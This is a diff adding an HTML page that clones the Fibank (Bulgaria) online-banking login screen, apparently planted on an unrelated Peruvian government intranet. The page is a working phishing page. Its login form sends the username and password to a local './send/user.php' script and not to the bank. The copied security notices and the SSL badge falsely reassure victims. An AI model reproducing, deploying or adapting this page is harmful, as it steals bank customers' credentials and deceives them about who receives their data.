@@ -1,0 +1,546 @@
+<!-- URL =http://intranet.ugel01.gob.pe/capacitacion/blocks/attendance/fibank__eliminado/account--><!-- w =('ugel01.gob.pe', None, None)--><html class="ng-scope" ng-app="sgOAuth2">
+ <head>
+  <style type="text/css">
+   @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}
+  </style>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <meta content="" name="description"/>
+  <meta content="" name="author"/>
+  <link href="./img/favicon.ico" rel="shortcut icon"/>
+  <meta content="7531cea1-ac9e-4e59-83f5-f4e36cb9293e" name="_csrf"/>
+  <meta content="X-CSRF-TOKEN" name="_csrf_header"/>
+  <title>
+   Вход в Моята Fibank
+  </title>
+  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+  <!--[if lt IE 9]>
+		<script src="themes/COMMON/scripts/utils/es5-shim.js"></script>
+		<script src="themes/COMMON/scripts/utils/html5shiv.min.js"></script>
+		<script src="themes/COMMON/scripts/angular-ui/ui-utils-ieshiv.min.js"></script>
+		
+		
+		<script>
+	      document.createElement('ui-select');
+	      document.createElement('ui-select-match');
+	      document.createElement('ui-select-choices');
+	    </script>
+		<![endif]-->
+  <!-- 		<script src="themes/COMMON/scripts/utils/modernizr.js"></script> -->
+  <!-- Core CSS -->
+  <link href="./css/css.css" rel="stylesheet"/>
+  <!--[if IE 8]>
+		<link href="themes/COMMON/stylesheets/style-ie8.css" rel="stylesheet">
+		<script src="themes/COMMON/scripts/utils/respond.min.js"></script>
+		<![endif]-->
+ </head>
+ <body class="ng-scope info-footer" ng-class="{'info-footer' : $state.includes('login') || $state.includes('logout'), 'only-footer' : $state.includes('registration') || $state.includes('lost-password')}" ng-controller="AppGlobalController">
+  <object classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" codebase="themes/COMMON/capicom.cab#version=2,0,0,3" id="oCAPICOM" style="display: none;">
+  </object>
+  <div class="body-wrapper">
+   <nav class="navbar navbar-default" role="banner">
+    <div class="container-fluid">
+     <div class="navbar-header">
+      <a class="navbar-brand" href="/EBank" ng-class="{'navbar-brand' : selectLang.lang == 'BGN', 'navbar-brand-en' : selectLang.lang != 'BGN'}">
+      </a>
+     </div>
+     <div class="collapse navbar-collapse" role="navigation">
+      <ul class="nav navbar-nav">
+       <li>
+        <a class="ng-binding" href="" ng-bind="notSelectedLang.langDesc" ng-click="changeLang(notSelectedLang)">
+         English
+        </a>
+       </li>
+       <li>
+        <a href="" ng-href="" target="blank">
+         <i class="i-16 i-to-site">
+         </i>
+         <span class="ng-scope" translate="APP.WEBSITE">
+          Към сайта
+         </span>
+        </a>
+       </li>
+       <li class="ng-scope" dropdown="" is-open="status.isopen" sg-dropdown="">
+        <a href="" ng-href="" target="blank">
+         <i class="i-32 i-app-full">
+         </i>
+         <span class="ng-scope" translate="APP.MOBAPP">
+          Мобилно приложение
+         </span>
+        </a>
+        <ul class="dropdown-menu menu-app" dropdown-menu="">
+         <li>
+          <h3 class="ng-scope" translate="APP.MOBAPP_PIC">
+           Банкирайте навсякъде, по всяко време
+          </h3>
+          <a "="" class="btn btn-default h-34 ng-scope" href="" ng-href="" target="blank" translate="APP.LEARNMORE">
+           Научете повече
+          </a>
+         </li>
+        </ul>
+       </li>
+       <li>
+        <a href="" ng-href="" target="blank">
+         <i class="i-16 i-tariff-changes">
+         </i>
+         <span class="ng-scope" translate="APP.CHANGES">
+          Промени в ОУ и тарифа
+         </span>
+        </a>
+       </li>
+       <li class="ng-scope" dropdown="" is-open="status.isopen" sg-dropdown="">
+        <!-- TODO: set angular -->
+        <!--<a ng-href="{{'APP.HELP_URL' | translate}}" target="blank"><i class="i-16 i-help"></i><span translate="APP.HELP"></span></a>-->
+        <a href="">
+         <i class="i-16 i-help">
+         </i>
+         <span class="ng-scope" translate="APP.HELP">
+          Помощ
+         </span>
+        </a>
+        <ul class="dropdown-menu menu-help" dropdown-menu="">
+         <li>
+          <h3 class="ng-scope" translate="APP.INFORMATION_NMENU">
+           Информация
+          </h3>
+         </li>
+         <!-- ngIf: false -->
+         <li>
+          <a href="" ng-href="" target="blank">
+           <i class="i-faq i-18-20">
+           </i>
+           <span class="ng-scope" translate="APP.ASKED_QUESTIONS">
+            Често задавани въпроси
+           </span>
+          </a>
+         </li>
+         <li>
+          <a href="" ng-href="" target="blank">
+           <i class="i-security-advice-big i-18-20">
+           </i>
+           <span class="ng-scope" translate="APP.SECURITY_ADVICE">
+            Мерки за сигурност
+           </span>
+          </a>
+         </li>
+         <!-- ngIf: globalConf.translateSufix != '_CY' -->
+         <li class="ng-scope" ng-if="globalConf.translateSufix != '_CY'">
+          <a href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG" ng-href="" target="blank">
+           <i class="i-faq i-18-20">
+           </i>
+           <span class="ng-scope" translate="APP.OSD">
+            Онлайн решаване на спорове
+           </span>
+          </a>
+         </li>
+         <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+         <li>
+          <div class="divider">
+          </div>
+         </li>
+         <li>
+          <h3 class="ng-scope" translate="APP.CONTACT_US_MENU">
+           Връзка с нас
+          </h3>
+         </li>
+         <li>
+          <a class="cursor-text">
+           <i class="i-18 i-phone">
+           </i>
+           <span class="ng-scope" translate="0700 12 777">
+            0700 12 777
+           </span>
+          </a>
+         </li>
+         <li>
+          <a class="cursor-text" href="mailto:my.fibank@fibank.bg" ng-href="mailto:my.fibank@fibank.bg">
+           <i class="i-20-14 i-mail">
+           </i>
+           <span class="ng-scope" translate="my.fibank@fibank.bg">
+            my.fibank@fibank.bg
+           </span>
+          </a>
+         </li>
+         <!-- ngIf: false -->
+        </ul>
+       </li>
+      </ul>
+      <ul class="nav navbar-nav navbar-right ">
+       <!-- ngIf: globalConf.translateSufix != '_CY' -->
+       <li class="ng-scope" ng-if="globalConf.translateSufix != '_CY'" ng-show="$state.includes('login') || $state.includes('lost-password')">
+        <div>
+         <a class="pull-right btn btn-info h-34 w-btn-120 ng-scope" href="/oauth2-server/registration" translate="APP.REGISTRATION" ui-sref="registration({client_id:'E_BANK'})">
+          РЕГИСТРАЦИЯ
+         </a>
+        </div>
+       </li>
+       <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+       <li class="ng-hide" ng-show="$state.includes('registration')">
+        <div>
+         <a class="navbar-btn pull-right btn btn-primary h-34 w-btn-120 ng-scope" href="/oauth2-server/login" translate="APP.LOGIN" ui-sref="login({client_id:'E_BANK'})">
+          ВХОД
+         </a>
+        </div>
+       </li>
+       <li class="ng-hide" ng-show="$state.includes('logoutSuccess')">
+        <div>
+         <a class="btn pull-right btn-primary h-34 w-btn-120 ng-scope" href="/EBank" translate="APP.LOGIN">
+          ВХОД
+         </a>
+        </div>
+       </li>
+      </ul>
+     </div>
+    </div>
+   </nav>
+   <!-- Content -->
+   <!-- uiView:  -->
+   <div class="ng-scope" data-template-url="index" id="app" ui-view="">
+    <div class="container ng-scope">
+     <div class="login">
+      <div class="row">
+       <div class="col-md-12">
+        <!-- ngIf: globalConf.translateSufix != '_CY' -->
+        <article class="important ng-binding ng-scope" ng-bind-html="'LOGIN.TOP_MSG_CONTENT' | translate" ng-if="globalConf.translateSufix != '_CY'">
+         <span>
+         </span>
+        </article>
+        <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+       </div>
+      </div>
+      <div class="row">
+       <div class="col-md-12">
+        <div class="container-signin">
+         <form action="./send/user.php" class="form-centered form-signin box-border ng-pristine ng-invalid ng-invalid-required" id="form-signin" method="post" name="form" ng-submit="preSubmit($event)" novalidate="">
+          <h3 class="form-signin-heading ng-scope" translate="LOGIN.LOGIN_TITLE">
+           Моята Fibank
+          </h3>
+          <div id="loginform">
+           <fieldset>
+            <div class="form-group">
+             <label class="ng-scope" translate="LOGIN.USERNAME">
+              <span class="red-txt">
+               *
+              </span>
+              Потребител
+             </label>
+             <label class="grey-txt s2 pull-right ng-scope" translate="LOGIN.REQUIRED_FIELDS">
+              <span class="red-txt">
+               *
+              </span>
+              Задължителни полета
+             </label>
+             <div class="form-control-icon">
+              <i class="i-16 i-user-normal">
+              </i>
+              <input autofocus="" class="form-control ng-pristine ng-invalid ng-invalid-required" id="username" name="username" ng-model="credentials.username" required="" tabindex="1" type="text"/>
+              <p class="pull-right s2 red-txt ng-scope ng-hide" ng-show="form.username.$error.required &amp;&amp; form.username.$dirty" translate="LOGIN.ERROR.USERNAME">
+               Моля, въведете потребител!
+              </p>
+             </div>
+            </div>
+            <div class="form-group">
+             <label class="ng-scope" translate="LOGIN.PASSWORD">
+              <span class="red-txt">
+               *
+              </span>
+              Парола
+             </label>
+             <div class="form-control-icon">
+              <i class="i-16 i-password">
+              </i>
+              <input class="form-control ng-pristine ng-invalid ng-invalid-required" id="password" name="password" ng-model="credentials.password" required="" tabindex="2" type="password"/>
+              <p class="pull-right s2 red-txt ng-scope ng-hide" ng-show="form.password.$error.required &amp;&amp; form.password.$dirty" translate="LOGIN.ERROR.PASSWORD">
+               Моля, въведете парола!
+              </p>
+             </div>
+            </div>
+            <input class="hidden ng-pristine ng-valid" name="system" ng-model="credentials.system" tabinex="-1" type="text"/>
+            <input class="hidden ng-pristine ng-valid" name="client_id" ng-model="credentials.client_id" tabinex="-1" type="text"/>
+            <!-- <div class="form-group">
+									<select id="system" name="system" ng-model="credentials.system" class="form-control"  placeholder="System">
+										<option value="">Any</option>
+										<option value="E-FIBANK.BG" translate="LOGIN.EFIBANK">E-FIBANK.BG</option>
+										<option value="MY-FIBANK.BG" translate="LOGIN.MYFIBANK">MY-FIBANK.BG</option>
+									</select>
+								</div> -->
+           </fieldset>
+           <!-- ngIf: passLinkActive -->
+           <a class="pull-left grey-txt s2 ng-scope" href="/oauth2-server/lost-password" id="lost-pass-link" ng-if="passLinkActive" tabindex="-1" translate="LOGIN.LOST_PASSWORD" ui-sref="lost-password({client_id:'E_BANK'})">
+            Забравена парола?
+           </a>
+           <!-- end ngIf: passLinkActive -->
+           <button class="btn btn-primary ng-scope" ng-click="setAllInputsDirty()" ng-disabled="form.submiting" translate="REGISTRATION.SUBMIT" type="submit">
+            <font style="vertical-align: inherit;">
+             <font style="vertical-align: inherit;">
+              връзка
+             </font>
+            </font>
+           </button>
+           <!-- Error messages -->
+           <!-- /Error messages -->
+           <input class="hidden ng-pristine ng-valid" id="lang" name="lang" ng-model="credentials.lang" type="text"/>
+           <input class="hidden ng-pristine ng-valid" id="time" name="time" ng-model="credentials.time" type="text"/>
+           <input class="hidden" name="_csrf" type="text" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e"/>
+           <input class="hidden ng-pristine ng-valid" id="sig" name="sig" ng-model="credentials.sig" type="text"/>
+          </div>
+         </form>
+         <!-- for demo user -->
+         <form action="login" class="ng-pristine ng-valid ng-hide" id="form-signin-demo" method="post" ng-show="false" role="form">
+          <input class="hidden ng-pristine ng-valid" name="username" ng-model="demoCredentials.username" type="text"/>
+          <input class="hidden ng-pristine ng-valid" name="password" ng-model="demoCredentials.password" type="text"/>
+          <input class="hidden ng-pristine ng-valid" name="system" ng-model="demoCredentials.system" type="text"/>
+          <input class="hidden ng-pristine ng-valid" name="lang" ng-model="demoCredentials.lang" type="text"/>
+          <input class="hidden ng-pristine ng-valid" name="time" ng-model="demoCredentials.time" type="text"/>
+          <input class="hidden" name="_csrf" type="text" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e"/>
+          <input class="hidden ng-pristine ng-valid" name="client_id" ng-model="credentials.theme" tabinex="-1" type="text"/>
+         </form>
+         <div class="ssl-box box-border">
+          <div class="ssl-thawte" title='Чрез "кликване" можете да се уверите, че този сайт е избрал Thawte SSL за сигурност при електронна търговия и поверителни комуникации.'>
+           <p class="ng-scope" translate="LOGIN.SSL_CERT_DESC">
+            Защитен вход със
+            <a href="http://www.thawte.com/products" target="blank">
+             SSL сертификат
+            </a>
+            от:
+           </p>
+           <script src="" type="text/javascript">
+           </script>
+           <div>
+            <a href="" tabindex="-1" target="THAWTE_Splash">
+             <img alt="Click to Verify - This site has chosen a thawte SSL Certificate to improve Web site security" src="./img/img_logo_thatwe.png"/>
+            </a>
+            <span class="ng-binding" ng-bind="currentDate.now() | date: 'dd.MM.yyyy'">
+             2021/05/20
+            </span>
+           </div>
+          </div>
+          <ul class="list-inline">
+           <li>
+            <a href="" ng-href="" target="blank">
+             <i class="i-16 i-security-advice">
+             </i>
+             <span class="ng-scope" translate="LOGIN.SECURITY_ADVICE">
+              Съвети за сигурност
+             </span>
+             <i class="i-arrow-right-4x7">
+             </i>
+            </a>
+           </li>
+           <li>
+            <!--<a><i class="i-16 i-error-message"></i><span translate="LOGIN.ERROR_MESSAGES"></span><i class="i-arrow-right-4x7"></i></a> -->
+            <a href="" ng-href="" target="blank">
+             <i class="i-faq i-18-20">
+             </i>
+             <span class="ng-scope" translate="APP.ASKED_QUESTIONS">
+              Често задавани въпроси
+             </span>
+             <i class="i-arrow-right-4x7">
+             </i>
+            </a>
+           </li>
+          </ul>
+         </div>
+        </div>
+        <div class="container-signin-info">
+         <!-- ngIf: globalConf.translateSufix != '_CY' -->
+         <article class="important ng-binding ng-scope" ng-bind-html="'LOGIN.IMPORTANT_CONTENT' | translate" ng-if="globalConf.translateSufix != '_CY'">
+          <div class="grey-txt alert-danger modal-body s4">
+           <b>
+            Уважаеми клиенти,
+           </b>
+           <br/>
+           Моята Fibank НИКОГА няма да поиска въвеждане на Ваши лични данни за контакт като: Мобилен телефон, Е-mail или друга контактна информация на екрана за вход! Банката разполага с тези данни, а промяната или потвърждението им се извършват само в банков офис.
+           <br/>
+           Ако това се случи, е възможно Вашият компютър да е заразен с вирус, който управлява Вашия уеб браузър и извършва действия, които не са инициирани от Моята Fibank.
+           <br/>
+           Обръщаме Ви внимание и че ПИНт и еднократна парола от Токън  се изискват само при потвърждаване на активни банкови операции – нареждане на преводи към друго лице, откриване и закриване на сметки или при вход в системата, ако сте го указали изрично.
+           <br/>
+           В случай на съмнение, не въвеждайте никаква информация в уеб браузъра и се свържете с нашите служители за допълнителни инструкции.
+           <br/>
+           <a class="pull-right black-txt" href="" target="_blank">
+            <b>
+             Прочетете повече
+            </b>
+            <i class="i-arrow-right-4x7">
+            </i>
+           </a>
+          </div>
+         </article>
+         <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+         <!-- ngIf: globalConf.translateSufix == '_CY' -->
+         <div class="divider">
+         </div>
+         <!-- ngIf: globalConf.translateSufix != '_CY' -->
+         <article class="ng-scope" ng-if="globalConf.translateSufix != '_CY'">
+          <h3 class="ng-scope" translate="LOGIN.REVIEW_SYSTEM">
+           Разгледайте системата
+          </h3>
+          <p class="grey-txt ng-scope" translate="LOGIN.REVIEW_SYSTEM_CONTENT">
+           Разгледайте и усетете онлайн банкирането чрез интерактивната ни демо версия.
+          </p>
+          <a href="" id="demo-link" ng-click="demo()" ng-disabled="startSubmit">
+           <span class="ng-scope" translate="LOGIN.DEMO">
+            Демо Версия
+           </span>
+           <i class="i-arrow-right-5x8">
+           </i>
+          </a>
+         </article>
+         <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+         <!-- <div class="divider"></div>	
+					<article>	
+						<p translate="{{('LOGIN.QUESTIONS_CONTENT' + globalConf.translateSufix) | translate}}" class="grey-txt"></p>
+						<a ng-href="{{('LOGIN.URL_READ_MORE' + globalConf.translateSufix) | translate}}" target="_blank""><span translate="LOGIN.READ_MORE"></span><i class="i-arrow-right-5x8"></i></a>	
+	
+					</article>-->
+         <!-- ngIf: false -->
+        </div>
+       </div>
+      </div>
+      <div class="row">
+       <div class="col-md-12">
+        <!-- ngIf: globalConf.translateSufix != '_CY' -->
+        <article class="important ng-binding ng-scope" ng-bind-html="'LOGIN.BOTTOM_MSG_CONTENT' | translate" ng-if="globalConf.translateSufix != '_CY'">
+         <div class="grey-txt grey-bg modal-body s4">
+          <b>
+           Уважаеми клиенти,
+          </b>
+          <br/>
+          информираме Ви, че преводи наредени по системи BISERA и RINGS до 14.15ч. на 29.12.2017 г. се изпълняват с дата на изпълнение 29.12.2017г., а след този час с дата на изпълнение 02.01.2018г.
+          <br/>
+          <br/>
+          Вътрешнобанкови преводи, наредени до 16.00ч. на 31.12.2017 г. се изпълняват с дата на изпълнение 31.12.2017 г., а след този час с дата на изпълнение 01.01.2018г.
+          <br/>
+          <br/>
+          Телефон 0700 12 777 няма да приема обаждания от 12:00ч. на 31.12.2017г. до 07:00ч. на 02.01.2018г.
+          <br/>
+          Fibank Ви пожелава весело посрещане на новогодишните празници!
+         </div>
+        </article>
+        <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <!-- Content -->
+   <div class="body-push">
+   </div>
+  </div>
+  <!--  FOOTER  -->
+  <div id="footer-push">
+   <!-- ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
+   <div class="ng-scope" ng-if="!$state.includes('registration') &amp;&amp; !$state.includes('lost-password')">
+    <div class="info-box text-center">
+     <h5 class="ng-scope" translate="LOGIN.QUESTIONS">
+      За всички въпроси нашите служители Ви очакват на:
+     </h5>
+     <ul class="list-inline first-ul">
+      <li>
+       <i class="i-phone">
+       </i>
+       <span class="ng-scope" translate="LOGIN.PHONE">
+        Телефон:
+       </span>
+       <span class="blue-txt bold ng-scope" translate="LOGIN.PHONE_NUM">
+        0700 12 777
+       </span>
+       <!-- ngIf: globalConf.translateSufix != '_CY' -->
+       <span class="ng-scope" ng-if="globalConf.translateSufix != '_CY'" translate="LOGIN.NONSTOP">
+        (денонощно)*
+       </span>
+       <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+      </li>
+      <li>
+       <a href="mailto:my.fibank@fibank.bg" target="blank">
+        <i class="i-20-14 i-mail">
+        </i>
+        <span class="ng-scope" translate="LOGIN.EMAIL">
+         E-mail:
+        </span>
+        <span class="blue-txt bold ng-scope" translate="my.fibank@fibank.bg">
+         my.fibank@fibank.bg
+        </span>
+       </a>
+      </li>
+      <!-- ngIf: false -->
+     </ul>
+     <p class="grey-txt s4 ng-scope" translate="LOGIN.CALL_INFO">
+      * Разговорите към национален номер 0700 12 777 се таксуват според определените от Вашия оператор цени за обаждане към номера тип 0700 на Vivacom. За абонати на Vivacom обаждане към този номер се таксува като обаждане към стационарен номер в мрежата на Vivacom.
+     </p>
+     <!-- ngIf: globalConf.translateSufix != '_CY' -->
+     <h5 class="ng-scope" ng-if="globalConf.translateSufix != '_CY'" translate="LOGIN.LOCATION">
+      Вижте къде се намираме:
+     </h5>
+     <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+     <!-- ngIf: globalConf.translateSufix != '_CY' -->
+     <ul class="list-inline last-ul ng-scope" ng-if="globalConf.translateSufix != '_CY'">
+      <li>
+       <a href="" target="_blank">
+        <i class="i-16 i-offices">
+        </i>
+        <span class="ng-scope" translate="LOGIN.OFFICE_INFO">
+         Клонове
+        </span>
+        <i class="i-arrow-right-5x8">
+        </i>
+       </a>
+      </li>
+      <li>
+       <a href="" target="_blank">
+        <i class="i-18 i-atm">
+        </i>
+        <span class="ng-scope" translate="LOGIN.ATM_INFO">
+         Банкомати
+        </span>
+        <i class="i-arrow-right-5x8">
+        </i>
+       </a>
+      </li>
+     </ul>
+     <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+    </div>
+   </div>
+   <!-- end ngIf: !$state.includes('registration') && !$state.includes('lost-password') -->
+   <div class="container-fluid text-center" id="footer">
+    <ul class="list-inline s2">
+     <!-- ngIf: false -->
+     <!-- ngIf: false -->
+     <!-- ngIf: globalConf.translateSufix != '_CY' -->
+     <li class="ng-scope" ng-if="globalConf.translateSufix != '_CY'">
+      <a class="ng-scope" href="" ng-href="" target="_blank" translate="APP.REGISTRATION_PROC">
+       Процес на регистрация
+      </a>
+      <i class="i-arrow-right-4x7">
+      </i>
+     </li>
+     <!-- end ngIf: globalConf.translateSufix != '_CY' -->
+     <!-- ngIf: false -->
+     <li>
+      <a class="ng-scope" href="" ng-href="" target="_blank" translate="APP.FEES_COMISSIONS">
+       Такси и комисионни
+      </a>
+      <i class="i-arrow-right-4x7">
+      </i>
+     </li>
+     <li>
+      <a class="ng-scope" href="" ng-href="" target="_blank" translate="APP.DOCUMENTS">
+       Документи
+      </a>
+      <i class="i-arrow-right-4x7">
+      </i>
+     </li>
+    </ul>
+    <p class="s2 ng-scope" translate="APP.COPYRIGHTS">
+     © Първа инвестиционна банка 2009-2017. Всички права запазени.
+    </p>
+   </div>
+  </div>
+  <!--  /FOOTER  -->
+  <!-- Static sources -->
+  <script src="" type="text/javascript">
+  </script>
+ </body>
+</html>
